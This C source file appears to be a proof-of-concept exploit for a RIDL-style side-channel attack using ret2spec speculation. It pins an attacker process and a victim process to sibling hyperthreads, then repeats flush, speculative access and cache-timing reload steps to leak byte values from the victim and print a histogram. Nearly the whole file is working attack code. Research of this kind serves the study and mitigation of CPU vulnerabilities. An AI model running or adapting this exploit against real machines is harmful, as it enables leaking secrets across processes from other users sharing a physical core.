#define _GNU_SOURCE
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <signal.h>
#include <sched.h>

#include "asm.h"
#include "constants.h"
#include "flush_and_reload.h"
#include "find_threshold.h"
#include "ret2spec.h"

int main() {
  // Define where to run the RIDL code and where to run the
  // victim code (different hyperthreads, same physical core)
  int parent_cpu = 1;
  int victim_cpu = 3;

  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(parent_cpu, &cpu_set);
  int affinity = sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set); 
  assert(!affinity);

  pid_t pid = fork();
	if (pid == 0) {
		while (1)
			asm volatile(
				"movq %0, (%%rsp)\n"
        "clflush (%%rsp)\n"
				"mfence\n"
				::"r"(0xf8f7f6f5f4f3f2f1ull));
	}
	if (pid < 0) return 1;

  CPU_ZERO(&cpu_set);
  CPU_SET(victim_cpu, &cpu_set);
  affinity = sched_setaffinity(pid, sizeof(cpu_set_t), &cpu_set); 
  assert(!affinity);

  const size_t leak_size = PAGE_SIZE * VALUES_IN_BYTE;
  void* leak_buffer = mmap(NULL,
                        leak_size,
                        PROT_READ,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
                        -1,
                        0);
  assert(leak_buffer != NULL);

  // Where we will measure the cache times
  const size_t reload_size = PAGE_SIZE * VALUES_IN_BYTE;
  void* reload_buffer = mmap(NULL,
                        reload_size,
                        PROT_READ,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
                        -1,
                        0);
  assert(reload_buffer != NULL);

  size_t results[VALUES_IN_BYTE] = {0};

  // Determine a threshold for when a cache is hot or cold
  // size_t threshold = find_in_cache_threshold();
  size_t threshold = 150;
  assert(threshold > 0);

  madvise(leak_buffer, PAGE_SIZE, MADV_DONTNEED | MADV_PAGEOUT);
  mfence();

  for (int i = 0; i < 100000; ++i) {
    flush(VALUES_IN_BYTE, PAGE_SIZE, reload_buffer);
    ret2spec(&leak_buffer, reload_buffer);
    reload(VALUES_IN_BYTE, PAGE_SIZE, reload_buffer, results, threshold);
  }

  for (size_t i = 0; i < VALUES_IN_BYTE; ++i) {
    printf("%lx\t%ld\n", i, results[i]);
  }

  kill(pid, 9);

  return 0;
}
